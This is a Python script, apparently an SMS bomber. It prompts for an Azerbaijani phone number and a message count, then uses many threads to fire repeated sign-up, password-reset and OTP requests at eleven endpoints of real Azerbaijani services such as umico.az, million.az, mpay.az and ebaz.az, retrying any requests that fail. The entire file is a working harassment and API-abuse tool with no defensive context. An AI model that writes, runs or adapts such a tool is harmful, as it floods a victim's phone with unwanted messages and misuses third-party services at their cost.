import requests
import threading
import time

def send_post_request(url, headers, data, thread_num, total_requests, failed_requests, max_retries=6):
    for i in range(total_requests):
        retries = 0
        success = False
        while not success and retries < max_retries:
            try:
                response = requests.post(url, headers=headers, json=data)
                if 200 <= response.status_code < 300:
                    success = True
                    print(f'T {thread_num}, Request {i+1}, Status Code: {response.status_code}')
                else:
                    print(f'T {thread_num}, Request {i+1}, Status Code: {response.status_code}, Retrying...')
                    retries += 1
                    time.sleep(1) 
            except requests.exceptions.RequestException as e:
                print(f'Thread {thread_num}, Request {i+1}, Error: {e}, Retrying...')
                retries += 1
                time.sleep(1) 
                if retries == max_retries:
                    failed_requests.append((url, headers, data))

def send_get_request(url, thread_num, total_requests, failed_requests, max_retries=4):
    for i in range(total_requests):
        retries = 0
        success = False
        while not success and retries < max_retries:
            try:
                response = requests.get(url)
                if 200 <= response.status_code < 300:
                    success = True
                    print(f'T {thread_num}, Request {i+1}, Status Code: {response.status_code}')
                else:
                    print(f'T {thread_num}, Request {i+1}, Status Code: {response.status_code}, Retrying...')
                    retries += 1
                    time.sleep(1) 
            except requests.exceptions.RequestException as e:
                print(f'T {thread_num}, Request {i+1}, Error: {e}, Retrying...')
                retries += 1
                time.sleep(1) 
                if retries == max_retries:
                    failed_requests.append((url, None, None))

def retry_failed_requests(failed_requests, max_retries=2):
    for _ in range(max_retries):
        print(f'Retrying failed requests, Attempt {_+1}')
        new_failed_requests = []
        for url, headers, data in failed_requests:
            try:
                if data is not None:
                    response = requests.post(url, headers=headers, json=data)
                else:
                    response = requests.get(url)
                if 200 <= response.status_code < 300:
                    print(f'Retrying request to {url}, Status Code: {response.status_code}')
                else:
                    print(f'Retrying request to {url}, Status Code: {response.status_code}, Retrying...')
                    new_failed_requests.append((url, headers, data))
            except requests.exceptions.RequestException as e:
                print(f'Retrying request to {url}, Error: {e}, Retrying...')
                new_failed_requests.append((url, headers, data))
        failed_requests = new_failed_requests

def main():
    total_requests = int(input("SMS Sayı "))
    threads = int(input("Multi Request sayı "))

    requests_per_thread = total_requests // threads
    extra_requests = total_requests % threads

    phone_number = input("Nömrə +994: ")

    umico_phone = f"+994{phone_number}"
    umireg_phone = phone_number
    million_phone = f"994{phone_number}"
    milreg_phone = f"994{phone_number}"
    port_phone = f"0{phone_number}"
    portr_phone = f"0{phone_number}"
    pro_phone = f"994{phone_number}"
    mpayr_phone = f"+994{phone_number}"
    mpay_phone = f"+994{phone_number}"
    baz_phone = f"+994{phone_number}"
    bazr_phone = f"+994{phone_number}"

    umico_url = "https://customer.umico.az/v2/clients/account/sign-up"
    umico_headers = {
        'Host': 'customer.umico.az',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    }
    umico_data = {
        "phone": umico_phone
    }
    
    umireg_url = f"https://customer.umico.az/v2/clients/account/sign-in?phone=%2B994{umireg_phone}"
    
    million_url = "https://pgapi.million.az/accounts/registration-request"
    million_headers = {
        'Host': 'pgapi.million.az',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    }
    million_data = {
    "phoneNumber": million_phone
    }
    
    milreg_url = "https://pgapi.million.az/accounts/reset-password-request"
    milreg_headers = {
        'Host': 'pgapi.million.az',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json'
    }
    milreg_data = {
    "phoneNumber": milreg_phone
    }
    
    port_url = "https://portmanat.az/register"
    port_headers = {
        'Host': 'portmanat.az',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/json;charset=utf-8'
    }
    port_data = {
        "number": port_phone,
        "lang":"az"
    }
    
    portr_url = "https://portmanat.az/resetPassword"
    portr_headers = {
        'Host': 'portmanat.az',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Content-Type': 'application/json;charset=utf-8',
        'Content-Length': '37'
    }
    portr_data = {
        "username": portr_phone,
        "lang":"az"
    }
    
    pro_url = "https://api.promusic.az/api/v1/password/forgot"
    pro_headers = {
        'Host': 'api.promusic.az',
        'Content-Type': 'application/json',
        'Content-Length': '24'
    }
    pro_data = {
        "phone": pro_phone
    }
    
    mpayr_url = "https://endpoint.mpay.az/api/v1/users/forgot-password"
    mpayr_headers = {
        'Host': 'endpoint.mpay.az',
        'Content-Type': 'application/json',
        'Device-Type': 'WEB'
    }
    mpayr_data = {
        "username": mpayr_phone
    }
    
    mpay_url = "https://endpoint.mpay.az/api/v2/users/signup"
    mpay_headers = {
        'Host': 'endpoint.mpay.az',
        'Device-Type': 'WEB',
        'Content-Type': 'application/json'
    }
    mpay_data = {
        "username": mpay_phone,
        "password":"DjgkJf?!74y72?xS"
    }
    
    baz_url = "https://api.ebaz.az/registrationSendOTP"
    baz_headers = {
        'Host': 'api.ebaz.az',
        'Content-Type': 'application/json'
    }
    baz_data = {
        "mobileNum": baz_phone
    }
    
    bazr_url = "https://api.ebaz.az/loginSendOTP"
    bazr_headers = {
        'Host': 'api.ebaz.az',
        'Content-Type': 'application/json'
    }
    bazr_data = {
        "mobileNum": bazr_phone
    }

    failed_requests = []

    thread_list = []

    for i in range(threads):
        if i < extra_requests:
            umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, i+1, requests_per_thread + 1, failed_requests))
            umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, i+1, requests_per_thread + 1, failed_requests))
            million_thread = threading.Thread(target=send_post_request, args=(million_url, million_headers, million_data, i+1, requests_per_thread + 1, failed_requests))
            milreg_thread = threading.Thread(target=send_post_request, args=(milreg_url, milreg_headers, milreg_data, i+1, requests_per_thread + 1, failed_requests))
            port_thread = threading.Thread(target=send_post_request, args=(port_url, port_headers, port_data, i+1, requests_per_thread + 1, failed_requests))
            portr_thread = threading.Thread(target=send_post_request, args=(portr_url, portr_headers, portr_data, i+1, requests_per_thread + 1, failed_requests))
            pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, i+1, requests_per_thread + 1, failed_requests))
            mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, i+1, requests_per_thread + 1, failed_requests))
            mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, i+1, requests_per_thread + 1, failed_requests))
            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, i+1, requests_per_thread + 1, failed_requests))
            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, i+1, requests_per_thread + 1, failed_requests))
        else:
            umico_thread = threading.Thread(target=send_post_request, args=(umico_url, umico_headers, umico_data, i+1, requests_per_thread, failed_requests))
            umireg_thread = threading.Thread(target=send_get_request, args=(umireg_url, i+1, requests_per_thread, failed_requests))
            million_thread = threading.Thread(target=send_post_request, args=(million_url, million_headers, million_data, i+1, requests_per_thread, failed_requests))
            milreg_thread = threading.Thread(target=send_post_request, args=(milreg_url, milreg_headers, milreg_data, i+1, requests_per_thread, failed_requests))
            port_thread = threading.Thread(target=send_post_request, args=(port_url, port_headers, port_data, i+1, requests_per_thread, failed_requests))
            portr_thread = threading.Thread(target=send_post_request, args=(portr_url, portr_headers, portr_data, i+1, requests_per_thread, failed_requests))
            pro_thread = threading.Thread(target=send_post_request, args=(pro_url, pro_headers, pro_data, i+1, requests_per_thread, failed_requests))
            mpayr_thread = threading.Thread(target=send_post_request, args=(mpayr_url, mpayr_headers, mpayr_data, i+1, requests_per_thread, failed_requests))
            mpay_thread = threading.Thread(target=send_post_request, args=(mpay_url, mpay_headers, mpay_data, i+1, requests_per_thread, failed_requests))
            baz_thread = threading.Thread(target=send_post_request, args=(baz_url, baz_headers, baz_data, i+1, requests_per_thread, failed_requests))
            bazr_thread = threading.Thread(target=send_post_request, args=(bazr_url, bazr_headers, bazr_data, i+1, requests_per_thread, failed_requests))
        
        thread_list.append(umico_thread)
        thread_list.append(umireg_thread)
        thread_list.append(million_thread)
        thread_list.append(milreg_thread)
        thread_list.append(port_thread)
        thread_list.append(portr_thread)
        thread_list.append(pro_thread)
        thread_list.append(mpayr_thread)
        thread_list.append(mpay_thread)
        thread_list.append(baz_thread)
        thread_list.append(bazr_thread)
        umico_thread.start()
        umireg_thread.start()
        million_thread.start()
        milreg_thread.start()
        port_thread.start()
        portr_thread.start()
        pro_thread.start()
        mpayr_thread.start()
        mpay_thread.start()
        baz_thread.start()
        bazr_thread.start()

    for thread in thread_list:
        thread.join()

    retry_failed_requests(failed_requests)

if __name__ == "__main__":
    main()
